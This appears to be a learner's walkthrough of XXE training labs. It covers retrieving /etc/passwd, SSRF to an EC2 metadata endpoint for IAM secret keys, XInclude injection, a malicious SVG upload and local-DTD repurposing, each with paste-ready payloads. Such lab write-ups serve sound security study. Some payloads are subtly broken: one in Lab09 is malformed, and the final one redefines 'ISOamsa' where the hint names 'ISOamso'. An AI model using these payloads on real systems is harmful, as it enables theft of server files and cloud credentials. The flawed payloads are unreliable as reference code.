

						Lab01: Exploiting XXE using external entities to retrieve files
						
This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. 

Solution:

1) First we need to send the check stock request to the repeater.
2) Now in the request we need to make some changes.
3) We need to add 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
and the send the request.
4) After sending we get the passwd file contents and Lab is solved.


****************************************************************


							Lab02: Exploiting XXE to perform SSRF attacks
							
 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

Solution:

1) First we need to send the check stock request to the Repeater.
2) Then in the request we need to add
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
<stockCheck>.
3) Now we need to send the request we will get the name of next files and we need to enter every files till we dont get access keys.
4) In end we go till the request
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck>.


****************************************************************


							Lab07: Exploiting XInclude to retrieve files
							
 This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file. 

Solution:

1) First we need to sent the stock check request to the repeater.
2) Then in between the product id and store id we need to add productId=1<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1.
3) Now the lab is completed.


****************************************************************

							
							Lab08: Exploiting XXE via image file upload
							
 This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.

To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname. 

Solution:

1) First we need go onto any post add our details we also need to add an svg image file.
2) For this in terminal type touch test.svg and add picture as well everything.
3) Now send this request to the repeater.
4) In the repeater add <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> below the image content and send the request.
5) Now refresh the page again and we will see a new image posted open image in new tab and enter the hostname in submit solution section.


*******************************************************************


						Lab09: Exploiting XXE to retrieve data by repurposing a local DTD
						
 This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.
Hint

Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.


Solution:

1) So first we need to send the check stock request to repeater.
2) From there we get to know to that we can attack using xml.
3) Now we need to paste the command between the stock and 
?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/doesnotexit"> %xxe;]>

]><stockCheck>
4) Now we need to search for gosecure dtd xxe and in github we need to copy from files.txt.
5) Now we need to send the stock check request to repeater and $ add to /etc/filedoesnotexit and in payload paste all we copied from files,txt file and uncheck url encode in bottom, Now start attack.
6) Now we get file:///usr/share/yelp/dtd/docbookx.dtd"send this to repeater, copy this and search in browser and in github we will get the xml code copy code and paste in repeater.
7) Now paste the command i.e. 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

    <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]><stockCheck>

7) Hence Lab is solved.

							




